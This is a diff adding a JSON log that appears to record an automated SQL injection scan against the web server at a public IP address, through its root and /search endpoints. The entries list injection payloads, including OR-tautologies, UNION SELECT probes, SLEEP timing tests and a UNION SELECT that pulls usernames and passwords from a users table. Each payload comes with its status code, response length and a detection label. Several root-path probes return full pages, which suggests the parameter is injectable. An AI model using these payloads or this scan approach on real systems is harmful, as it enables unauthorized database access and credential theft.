@@ -1,0 +1,434 @@
+[
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 25735
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1168
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1156
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1135
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1296
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' OR '1'='1",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11266
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1180
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1183
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1168
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1147
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1304
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' OR '1'='1",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11260
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1171
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1174
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1159
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1138
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1146
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11280
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11282
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1176
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' OR 1=1--",
+    "type": "Boolean/Content",
+    "status_code": 200,
+    "response_length": 11258
+  },
+  {
+    "url": "http://52.247.225.51",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 500,
+    "response_length": 1298
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "test",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "1",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  },
+  {
+    "url": "http://52.247.225.51/search",
+    "param": "q",
+    "base_value": "'",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 404,
+    "response_length": 145
+  }
+]
